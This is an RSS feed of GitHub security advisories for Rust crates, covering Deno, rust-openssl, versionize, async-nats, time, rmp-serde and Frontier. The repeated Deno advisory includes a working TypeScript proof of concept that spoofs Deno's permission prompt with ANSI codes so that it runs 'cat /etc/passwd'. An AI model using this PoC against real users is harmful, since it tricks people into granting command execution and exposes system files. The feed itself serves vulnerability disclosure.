<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/rust.rss</id>
    <title>Security Advisory for Rust crates</title>
    <updated>2023-03-25T05:01:19.971Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arust"/>
    <subtitle>Security Advisory for Rust crates on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[deno] Interactive `run` permission prompt spoofing via improper ANSI neutralization]]></title>
        <id>https://github.com/advisories/GHSA-vq67-rp93-65qf</id>
        <link href="https://github.com/advisories/GHSA-vq67-rp93-65qf"/>
        <updated>2023-03-24T22:06:02.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Arbitrary program names without any ANSI filtering allows any malicious program to clear the first 2 lines of a <code>op_spawn_child</code> or <code>op_kill</code> prompt and replace it with any desired text.</p>
<h3 id="details">Details</h3>
<p>The main entry point comes down to the ability to override what the API control says (<a href="https://github.com/denoland/deno/blob/7d13d65468c37022f003bb680dfbddd07ea72173/runtime/js/40_process.js#L175">40_process.js</a>). Because of ANSI code's ability to clear lines, a malicious program can clear the last 2 lines of the prompt and put their own header. This also works in <code>op_kill</code>.</p>
<h3 id="poc">PoC</h3>
<p>This PoC works on 1.31.1, but modified versions of it work on older versions.</p>
<p>Make a file, e.g. <code>index.ts</code>, that uses this vulnerability to spoof the <code>op_spawn_child</code> permission prompt</p>
<pre><code class="language-ts">const boldANSI = "\u001b[1m" // bold
const unboldANSI = "\u001b[22m" // unbold

const prompt = `┌ ⚠️  ${boldANSI}Deno requests run access to "echo"${unboldANSI}
├ Requested by \`Deno.Command().output()`

const moveANSIUp = "\u001b[1A" // moves to the start of the line
const clearANSI = "\u001b[2K" // clears the line
const moveANSIStart = "\u001b[1000D" // moves to the start of the line

Deno[Object.getOwnPropertySymbols(Deno)[0]].core.ops.op_spawn_child({
    cmd: "cat",
    args: ["/etc/passwd"],
    clearEnv: false,
    env: [],
    stdin: "null",
    stdout: "inherit",
    stderr: "piped"
}, moveANSIUp + clearANSI + moveANSIStart + prompt)
</code></pre>
<p>Run the file with <code>deno run index.ts</code>.</p>
<h3 id="impact">Impact</h3>
<p>Any Deno program is able to spoof the interactive permission prompt for the <code>op_spawn_child</code> or the <code>op_kill</code> action (which indirectly gives access to all run commands) by overriding the <code>Requested by {message} API</code> with their own ANSI codes, allowing them to clear the latter prompt and change it to whatever they needed:</p>
<pre><code>// Expected Prompt
┌ ⚠️  Deno requests run access to "cat"
├ Requested by `Deno.Command().output()` API
├ Run again with --allow-run to bypass this prompt.
└ Allow? [y/n/A] (y = yes, allow; n = no, deny; A = allow all run permissions) &gt;

// Actual Prompt
┌ ⚠️  Deno requests run access to "echo"
├ Requested by `Deno.Command().output()` API
├ Run again with --allow-run to bypass this prompt.
└ Allow? [y/n/A] (y = yes, allow; n = no, deny; A = allow all run permissions) &gt;
</code></pre>
<p>This works with any command on the respective platform, giving the program the full ability to choose what program they wanted to run.</p>
<p>This problem can not be exploited on systems that do not attach an interactive prompt (for example headless servers).</p>
<p>Before <code>v1.31.0</code>, this requires the <code>--unstable</code> flag. </p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/denoland/deno/security/advisories/GHSA-vq67-rp93-65qf">https://github.com/denoland/deno/security/advisories/GHSA-vq67-rp93-65qf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-28446">https://nvd.nist.gov/vuln/detail/CVE-2023-28446</a></li>
<li><a href="https://github.com/denoland/deno/blob/7d13d65468c37022f003bb680dfbddd07ea72173/runtime/js/40_process.js#L175">https://github.com/denoland/deno/blob/7d13d65468c37022f003bb680dfbddd07ea72173/runtime/js/40_process.js#L175</a></li>
<li><a href="https://github.com/denoland/deno/releases/tag/v1.31.2">https://github.com/denoland/deno/releases/tag/v1.31.2</a></li>
<li><a href="https://github.com/advisories/GHSA-vq67-rp93-65qf">https://github.com/advisories/GHSA-vq67-rp93-65qf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vq67-rp93-65qf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-03-24T22:06:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[deno_runtime] Interactive `run` permission prompt spoofing via improper ANSI neutralization]]></title>
        <id>https://github.com/advisories/GHSA-vq67-rp93-65qf</id>
        <link href="https://github.com/advisories/GHSA-vq67-rp93-65qf"/>
        <updated>2023-03-24T22:06:02.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Arbitrary program names without any ANSI filtering allows any malicious program to clear the first 2 lines of a <code>op_spawn_child</code> or <code>op_kill</code> prompt and replace it with any desired text.</p>
<h3 id="details">Details</h3>
<p>The main entry point comes down to the ability to override what the API control says (<a href="https://github.com/denoland/deno/blob/7d13d65468c37022f003bb680dfbddd07ea72173/runtime/js/40_process.js#L175">40_process.js</a>). Because of ANSI code's ability to clear lines, a malicious program can clear the last 2 lines of the prompt and put their own header. This also works in <code>op_kill</code>.</p>
<h3 id="poc">PoC</h3>
<p>This PoC works on 1.31.1, but modified versions of it work on older versions.</p>
<p>Make a file, e.g. <code>index.ts</code>, that uses this vulnerability to spoof the <code>op_spawn_child</code> permission prompt</p>
<pre><code class="language-ts">const boldANSI = "\u001b[1m" // bold
const unboldANSI = "\u001b[22m" // unbold

const prompt = `┌ ⚠️  ${boldANSI}Deno requests run access to "echo"${unboldANSI}
├ Requested by \`Deno.Command().output()`

const moveANSIUp = "\u001b[1A" // moves to the start of the line
const clearANSI = "\u001b[2K" // clears the line
const moveANSIStart = "\u001b[1000D" // moves to the start of the line

Deno[Object.getOwnPropertySymbols(Deno)[0]].core.ops.op_spawn_child({
    cmd: "cat",
    args: ["/etc/passwd"],
    clearEnv: false,
    env: [],
    stdin: "null",
    stdout: "inherit",
    stderr: "piped"
}, moveANSIUp + clearANSI + moveANSIStart + prompt)
</code></pre>
<p>Run the file with <code>deno run index.ts</code>.</p>
<h3 id="impact">Impact</h3>
<p>Any Deno program is able to spoof the interactive permission prompt for the <code>op_spawn_child</code> or the <code>op_kill</code> action (which indirectly gives access to all run commands) by overriding the <code>Requested by {message} API</code> with their own ANSI codes, allowing them to clear the latter prompt and change it to whatever they needed:</p>
<pre><code>// Expected Prompt
┌ ⚠️  Deno requests run access to "cat"
├ Requested by `Deno.Command().output()` API
├ Run again with --allow-run to bypass this prompt.
└ Allow? [y/n/A] (y = yes, allow; n = no, deny; A = allow all run permissions) &gt;

// Actual Prompt
┌ ⚠️  Deno requests run access to "echo"
├ Requested by `Deno.Command().output()` API
├ Run again with --allow-run to bypass this prompt.
└ Allow? [y/n/A] (y = yes, allow; n = no, deny; A = allow all run permissions) &gt;
</code></pre>
<p>This works with any command on the respective platform, giving the program the full ability to choose what program they wanted to run.</p>
<p>This problem can not be exploited on systems that do not attach an interactive prompt (for example headless servers).</p>
<p>Before <code>v1.31.0</code>, this requires the <code>--unstable</code> flag. </p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/denoland/deno/security/advisories/GHSA-vq67-rp93-65qf">https://github.com/denoland/deno/security/advisories/GHSA-vq67-rp93-65qf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-28446">https://nvd.nist.gov/vuln/detail/CVE-2023-28446</a></li>
<li><a href="https://github.com/denoland/deno/blob/7d13d65468c37022f003bb680dfbddd07ea72173/runtime/js/40_process.js#L175">https://github.com/denoland/deno/blob/7d13d65468c37022f003bb680dfbddd07ea72173/runtime/js/40_process.js#L175</a></li>
<li><a href="https://github.com/denoland/deno/releases/tag/v1.31.2">https://github.com/denoland/deno/releases/tag/v1.31.2</a></li>
<li><a href="https://github.com/advisories/GHSA-vq67-rp93-65qf">https://github.com/advisories/GHSA-vq67-rp93-65qf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vq67-rp93-65qf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-03-24T22:06:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openssl] `openssl` `X509NameBuilder::build` returned object is not thread safe]]></title>
        <id>https://github.com/advisories/GHSA-3gxf-9r58-2ghg</id>
        <link href="https://github.com/advisories/GHSA-3gxf-9r58-2ghg"/>
        <updated>2023-03-24T22:01:36.000Z</updated>
        <content type="html"><![CDATA[<p>OpenSSL has a <code>modified</code> bit that it can set on on <code>X509_NAME</code> objects. If this bit is set then the object is not thread-safe even when it appears the code is not modifying the value.</p>
<p>Thanks to David Benjamin (Google) for reporting this issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/sfackler/rust-openssl/pull/1854">https://github.com/sfackler/rust-openssl/pull/1854</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2023-0022.html">https://rustsec.org/advisories/RUSTSEC-2023-0022.html</a></li>
<li><a href="https://github.com/advisories/GHSA-3gxf-9r58-2ghg">https://github.com/advisories/GHSA-3gxf-9r58-2ghg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3gxf-9r58-2ghg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-03-24T22:01:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openssl] `openssl` `SubjectAlternativeName` and `ExtendedKeyUsage::other` allow arbitrary file read]]></title>
        <id>https://github.com/advisories/GHSA-9qwg-crg9-m2vc</id>
        <link href="https://github.com/advisories/GHSA-9qwg-crg9-m2vc"/>
        <updated>2023-03-24T22:01:31.000Z</updated>
        <content type="html"><![CDATA[<p><code>SubjectAlternativeName</code> and <code>ExtendedKeyUsage</code> arguments were parsed using the OpenSSL function <code>X509V3_EXT_nconf</code>. This function parses all input using an OpenSSL mini-language which can perform arbitrary file reads.</p>
<p>Thanks to David Benjamin (Google) for reporting this issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/sfackler/rust-openssl/pull/1854">https://github.com/sfackler/rust-openssl/pull/1854</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2023-0023.html">https://rustsec.org/advisories/RUSTSEC-2023-0023.html</a></li>
<li><a href="https://github.com/advisories/GHSA-9qwg-crg9-m2vc">https://github.com/advisories/GHSA-9qwg-crg9-m2vc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9qwg-crg9-m2vc</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-03-24T22:01:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openssl] `openssl` `X509Extension::new` and `X509Extension::new_nid` null pointer dereference]]></title>
        <id>https://github.com/advisories/GHSA-6hcf-g6gr-hhcr</id>
        <link href="https://github.com/advisories/GHSA-6hcf-g6gr-hhcr"/>
        <updated>2023-03-24T22:01:24.000Z</updated>
        <content type="html"><![CDATA[<p>These functions would crash when the context argument was None with certain extension types.</p>
<p>Thanks to David Benjamin (Google) for reporting this issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/sfackler/rust-openssl/pull/1854">https://github.com/sfackler/rust-openssl/pull/1854</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2023-0024.html">https://rustsec.org/advisories/RUSTSEC-2023-0024.html</a></li>
<li><a href="https://github.com/advisories/GHSA-6hcf-g6gr-hhcr">https://github.com/advisories/GHSA-6hcf-g6gr-hhcr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6hcf-g6gr-hhcr</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-03-24T22:01:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[versionize] Versionize::deserialize implementation for FamStructWrapper<T> is lacking bound checks, potentially leading to out of bounds memory accesses]]></title>
        <id>https://github.com/advisories/GHSA-8vxc-r5wp-vgvc</id>
        <link href="https://github.com/advisories/GHSA-8vxc-r5wp-vgvc"/>
        <updated>2023-03-24T22:00:06.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An issue was discovered in the <code>Versionize::deserialize</code> implementation provided by the <code>versionize</code> crate for <code>vmm_sys_util::fam::FamStructWrapper</code>, which can lead to out of bounds memory accesses.</p>
<h3 id="patches">Patches</h3>
<p>The impact started with version 0.1.1. The issue was corrected in version 0.1.10 by inserting a check that verifies, for any deserialized header, the lengths of compared flexible arrays are equal and aborting deserialization otherwise.</p>
<h3 id="workarounds">Workarounds</h3>
<p>-</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/firecracker-microvm/versionize/pull/53">https://github.com/firecracker-microvm/versionize/pull/53</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/firecracker-microvm/versionize/security/advisories/GHSA-8vxc-r5wp-vgvc">https://github.com/firecracker-microvm/versionize/security/advisories/GHSA-8vxc-r5wp-vgvc</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-28448">https://nvd.nist.gov/vuln/detail/CVE-2023-28448</a></li>
<li><a href="https://github.com/firecracker-microvm/versionize/pull/53">https://github.com/firecracker-microvm/versionize/pull/53</a></li>
<li><a href="https://github.com/firecracker-microvm/versionize/commit/a57a051ba006cfa3b41a0532f484df759e008d47">https://github.com/firecracker-microvm/versionize/commit/a57a051ba006cfa3b41a0532f484df759e008d47</a></li>
<li><a href="https://github.com/firecracker-microvm/versionize/releases/tag/v0.1.10">https://github.com/firecracker-microvm/versionize/releases/tag/v0.1.10</a></li>
<li><a href="https://github.com/advisories/GHSA-8vxc-r5wp-vgvc">https://github.com/advisories/GHSA-8vxc-r5wp-vgvc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8vxc-r5wp-vgvc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-03-24T22:00:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[async-nats] async-nats vulnerable to TLS certificate common name validation bypass]]></title>
        <id>https://github.com/advisories/GHSA-f5v5-ccqc-6w36</id>
        <link href="https://github.com/advisories/GHSA-f5v5-ccqc-6w36"/>
        <updated>2023-03-24T21:59:54.000Z</updated>
        <content type="html"><![CDATA[<p>The NATS official Rust clients are vulnerable to MitM when using TLS.</p>
<p>The common name of the server's TLS certificate is validated against the <code>host</code>name provided by the server's plaintext <code>INFO</code> message during the initial connection setup phase. A MitM proxy can tamper with the <code>host</code> field's value by substituting it with the common name of a valid certificate it controls, fooling the client into accepting it.</p>
<h2 id="reproduction-steps">Reproduction steps</h2>
<ol>
<li>The NATS Rust client tries to establish a new connection</li>
<li>The connection is intercepted by a MitM proxy</li>
<li>The proxy makes a separate connection to the NATS server</li>
<li>The NATS server replies with an <code>INFO</code> message</li>
<li>The proxy reads the <code>INFO</code>, alters the <code>host</code> JSON field and passes the tampered <code>INFO</code> back to the client</li>
<li>The proxy upgrades the client connection to TLS, presenting a certificate issued by a certificate authority present in the client's keychain. In the previous step the <code>host</code> was set to the common name of said certificate</li>
<li><code>rustls</code> accepts the certificate, having verified that the common name matches the attacker-controlled value it was given</li>
<li>The client has been fooled by the MitM proxy into accepting the attacker-controlled certificate</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nats-io/nats.rs/commit/817a7b942c462fa9d9938dcb62124173634132fb#diff-767d442397fcaaf2f83e8f924d4a70317a2ce4703a49964d6007707949cfa5f5L303-R304">https://github.com/nats-io/nats.rs/commit/817a7b942c462fa9d9938dcb62124173634132fb#diff-767d442397fcaaf2f83e8f924d4a70317a2ce4703a49964d6007707949cfa5f5L303-R304</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2023-0027.html">https://rustsec.org/advisories/RUSTSEC-2023-0027.html</a></li>
<li><a href="https://github.com/advisories/GHSA-f5v5-ccqc-6w36">https://github.com/advisories/GHSA-f5v5-ccqc-6w36</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f5v5-ccqc-6w36</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-03-24T21:59:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[deno_runtime] Deno improperly handles resizable ArrayBuffer]]></title>
        <id>https://github.com/advisories/GHSA-c25x-cm9x-qqgx</id>
        <link href="https://github.com/advisories/GHSA-c25x-cm9x-qqgx"/>
        <updated>2023-03-24T13:32:17.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><a href="https://github.com/tc39/proposal-resizablearraybuffer">Resizable ArrayBuffers</a> passed to asynchronous native functions that are shrunk during the asynchronous operation could result in an out-of-bound read/write.</p>
<p>It is unlikely that this has been exploited in the wild, as the only version affected is Deno 1.32.0.</p>
<p>Deno Deploy users are not affected.</p>
<h3 id="patches">Patches</h3>
<p>The problem has been resolved by disabling resizable ArrayBuffers temporarily in Deno 1.32.1. Deno 1.32.2 will re-enable resizable ArrayBuffers with a proper fix.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Upgrade to Deno 1.32.1, or run with <code>--v8-flags=--no-harmony-rab-gsab</code> to disable resizable ArrayBuffers.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/denoland/deno/security/advisories/GHSA-c25x-cm9x-qqgx">https://github.com/denoland/deno/security/advisories/GHSA-c25x-cm9x-qqgx</a></li>
<li><a href="https://github.com/denoland/deno/pull/18395">https://github.com/denoland/deno/pull/18395</a></li>
<li><a href="https://github.com/denoland/deno/releases/tag/v1.32.1">https://github.com/denoland/deno/releases/tag/v1.32.1</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-28445">https://nvd.nist.gov/vuln/detail/CVE-2023-28445</a></li>
<li><a href="https://github.com/advisories/GHSA-c25x-cm9x-qqgx">https://github.com/advisories/GHSA-c25x-cm9x-qqgx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c25x-cm9x-qqgx</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2023-03-23T23:13:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[serde_v8] Deno improperly handles resizable ArrayBuffer]]></title>
        <id>https://github.com/advisories/GHSA-c25x-cm9x-qqgx</id>
        <link href="https://github.com/advisories/GHSA-c25x-cm9x-qqgx"/>
        <updated>2023-03-24T13:32:17.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><a href="https://github.com/tc39/proposal-resizablearraybuffer">Resizable ArrayBuffers</a> passed to asynchronous native functions that are shrunk during the asynchronous operation could result in an out-of-bound read/write.</p>
<p>It is unlikely that this has been exploited in the wild, as the only version affected is Deno 1.32.0.</p>
<p>Deno Deploy users are not affected.</p>
<h3 id="patches">Patches</h3>
<p>The problem has been resolved by disabling resizable ArrayBuffers temporarily in Deno 1.32.1. Deno 1.32.2 will re-enable resizable ArrayBuffers with a proper fix.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Upgrade to Deno 1.32.1, or run with <code>--v8-flags=--no-harmony-rab-gsab</code> to disable resizable ArrayBuffers.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/denoland/deno/security/advisories/GHSA-c25x-cm9x-qqgx">https://github.com/denoland/deno/security/advisories/GHSA-c25x-cm9x-qqgx</a></li>
<li><a href="https://github.com/denoland/deno/pull/18395">https://github.com/denoland/deno/pull/18395</a></li>
<li><a href="https://github.com/denoland/deno/releases/tag/v1.32.1">https://github.com/denoland/deno/releases/tag/v1.32.1</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-28445">https://nvd.nist.gov/vuln/detail/CVE-2023-28445</a></li>
<li><a href="https://github.com/advisories/GHSA-c25x-cm9x-qqgx">https://github.com/advisories/GHSA-c25x-cm9x-qqgx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c25x-cm9x-qqgx</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2023-03-23T23:13:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Deno] Deno improperly handles resizable ArrayBuffer]]></title>
        <id>https://github.com/advisories/GHSA-c25x-cm9x-qqgx</id>
        <link href="https://github.com/advisories/GHSA-c25x-cm9x-qqgx"/>
        <updated>2023-03-24T13:32:17.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><a href="https://github.com/tc39/proposal-resizablearraybuffer">Resizable ArrayBuffers</a> passed to asynchronous native functions that are shrunk during the asynchronous operation could result in an out-of-bound read/write.</p>
<p>It is unlikely that this has been exploited in the wild, as the only version affected is Deno 1.32.0.</p>
<p>Deno Deploy users are not affected.</p>
<h3 id="patches">Patches</h3>
<p>The problem has been resolved by disabling resizable ArrayBuffers temporarily in Deno 1.32.1. Deno 1.32.2 will re-enable resizable ArrayBuffers with a proper fix.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Upgrade to Deno 1.32.1, or run with <code>--v8-flags=--no-harmony-rab-gsab</code> to disable resizable ArrayBuffers.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/denoland/deno/security/advisories/GHSA-c25x-cm9x-qqgx">https://github.com/denoland/deno/security/advisories/GHSA-c25x-cm9x-qqgx</a></li>
<li><a href="https://github.com/denoland/deno/pull/18395">https://github.com/denoland/deno/pull/18395</a></li>
<li><a href="https://github.com/denoland/deno/releases/tag/v1.32.1">https://github.com/denoland/deno/releases/tag/v1.32.1</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-28445">https://nvd.nist.gov/vuln/detail/CVE-2023-28445</a></li>
<li><a href="https://github.com/advisories/GHSA-c25x-cm9x-qqgx">https://github.com/advisories/GHSA-c25x-cm9x-qqgx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c25x-cm9x-qqgx</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2023-03-23T23:13:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[time] Segmentation fault in time]]></title>
        <id>https://github.com/advisories/GHSA-wcg3-cvx6-7396</id>
        <link href="https://github.com/advisories/GHSA-wcg3-cvx6-7396"/>
        <updated>2023-03-23T23:05:19.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Unix-like operating systems may segfault due to dereferencing a dangling pointer in specific circumstances. This requires an environment variable to be set in a different thread than the affected functions. This may occur without the user's knowledge, notably in a third-party library.</p>
<p>The affected functions from time 0.2.7 through 0.2.22 are:</p>
<ul>
<li><code>time::UtcOffset::local_offset_at</code></li>
<li><code>time::UtcOffset::try_local_offset_at</code></li>
<li><code>time::UtcOffset::current_local_offset</code></li>
<li><code>time::UtcOffset::try_current_local_offset</code></li>
<li><code>time::OffsetDateTime::now_local</code></li>
<li><code>time::OffsetDateTime::try_now_local</code></li>
</ul>
<p>The affected functions in time 0.1 (all versions) are:</p>
<ul>
<li><code>at</code></li>
<li><code>at_utc</code></li>
<li><code>now</code></li>
</ul>
<p>Non-Unix targets (including Windows and wasm) are unaffected.</p>
<h3 id="patches">Patches</h3>
<p>In some versions of <code>time</code>, the internal method that determines the local offset has been modified to always return <code>None</code> on the affected operating systems. This has the effect of returning an <code>Err</code> on the <code>try_*</code> methods and <code>UTC</code> on the non-<code>try_*</code> methods. In later versions, <code>time</code> will attempt to determine the number of threads running in the process. If the process is single-threaded, the call will proceed as its safety invariant is upheld.</p>
<p>Users and library authors with time in their dependency tree must perform <code>cargo update</code>, which will pull in the updated, unaffected code.</p>
<p>Users of time 0.1 do not have a patch and must upgrade to an unaffected version: time 0.2.23 or greater or the 0.3 series.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Library authors must ensure that the program only has one running thread at the time of calling any affected method. Binary authors may do the same and/or ensure that no other thread is actively mutating the environment.</p>
<h3 id="references">References</h3>
<p><a href="https://github.com/time-rs/time/issues/293">time-rs/time#293</a>.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/time-rs/time/security/advisories/GHSA-wcg3-cvx6-7396">https://github.com/time-rs/time/security/advisories/GHSA-wcg3-cvx6-7396</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-26235">https://nvd.nist.gov/vuln/detail/CVE-2020-26235</a></li>
<li><a href="https://github.com/time-rs/time/issues/293">https://github.com/time-rs/time/issues/293</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2020-0071.html">https://rustsec.org/advisories/RUSTSEC-2020-0071.html</a></li>
<li><a href="https://crates.io/crates/time/0.2.23">https://crates.io/crates/time/0.2.23</a></li>
<li><a href="https://github.com/advisories/GHSA-wcg3-cvx6-7396">https://github.com/advisories/GHSA-wcg3-cvx6-7396</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wcg3-cvx6-7396</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2021-08-25T20:56:46.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rmp-serde] `rmp-serde` `Raw` and `RawRef` may crash when receiving invalid UTF-8]]></title>
        <id>https://github.com/advisories/GHSA-255r-3prx-mf99</id>
        <link href="https://github.com/advisories/GHSA-255r-3prx-mf99"/>
        <updated>2023-03-22T22:21:50.000Z</updated>
        <content type="html"><![CDATA[<p>It was found that <code>Raw::from_utf8</code> expects valid UTF-8. If invalid UTF-8 is received it can cause the process to crash.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/3Hren/msgpack-rust/issues/305">https://github.com/3Hren/msgpack-rust/issues/305</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2022-0092.html">https://rustsec.org/advisories/RUSTSEC-2022-0092.html</a></li>
<li><a href="https://github.com/advisories/GHSA-255r-3prx-mf99">https://github.com/advisories/GHSA-255r-3prx-mf99</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-255r-3prx-mf99</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-03-22T22:21:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[frontier] Frontier's modexp precompile is slow for even modulus]]></title>
        <id>https://github.com/advisories/GHSA-fcmm-54jp-7vf6</id>
        <link href="https://github.com/advisories/GHSA-fcmm-54jp-7vf6"/>
        <updated>2023-03-22T21:40:47.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Frontier's <code>modexp</code> precompile uses <code>num-bigint</code> crate under the hood. <a href="https://github.com/rust-num/num-bigint/blob/6f2b8e0fc218dbd0f49bebb8db2d1a771fe6bafa/src/biguint/power.rs#L134">In the implementation</a>, the cases for modulus being even and modulus being odd are treated separately. Odd modulus uses the fast Montgomery multiplication, and even modulus uses the slow plain power algorithm. This gas cost discrepancy was not accounted for in the <code>modexp</code> precompile, leading to possible denial of service attacks.</p>
<h3 id="patches">Patches</h3>
<p>No fixes for <code>num-bigint</code> is currently available, and thus this advisory will be first fixed in the short term by raising the gas costs for even modulus, and in the long term fixing it in <code>num-bigint</code> or switching to another modexp implementation.</p>
<p>The short-term fix for Frontier is deployed at <a href="https://github.com/paritytech/frontier/pull/1017">PR 1017</a>.</p>
<p>The recommendations are as follows:</p>
<ul>
<li>If you anticipate malicious validators, it's recommended to issue an emergency runtime upgrade as soon as possible.</li>
<li>If you do not anticipate malicious validators, it's recommended to issue a normal runtime upgrade, as Substrate has builtin timeout protection when validators are building blocks.</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>None.</p>
<h3 id="references">References</h3>
<p>A similar issue was presented in Geth's implementation and the fix can be found <a href="https://go-review.googlesource.com/c/go/+/420897">here</a>.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/paritytech/frontier/security/advisories/GHSA-fcmm-54jp-7vf6">https://github.com/paritytech/frontier/security/advisories/GHSA-fcmm-54jp-7vf6</a></li>
<li><a href="https://github.com/paritytech/frontier/pull/1017">https://github.com/paritytech/frontier/pull/1017</a></li>
<li><a href="https://github.com/paritytech/frontier/commit/5af12e94d7dfc8a0208a290643a800f55de7b219">https://github.com/paritytech/frontier/commit/5af12e94d7dfc8a0208a290643a800f55de7b219</a></li>
<li><a href="https://github.com/rust-num/num-bigint/blob/6f2b8e0fc218dbd0f49bebb8db2d1a771fe6bafa/src/biguint/power.rs#L134">https://github.com/rust-num/num-bigint/blob/6f2b8e0fc218dbd0f49bebb8db2d1a771fe6bafa/src/biguint/power.rs#L134</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-28431">https://nvd.nist.gov/vuln/detail/CVE-2023-28431</a></li>
<li><a href="https://github.com/advisories/GHSA-fcmm-54jp-7vf6">https://github.com/advisories/GHSA-fcmm-54jp-7vf6</a></li>
</ul>
]]></content>
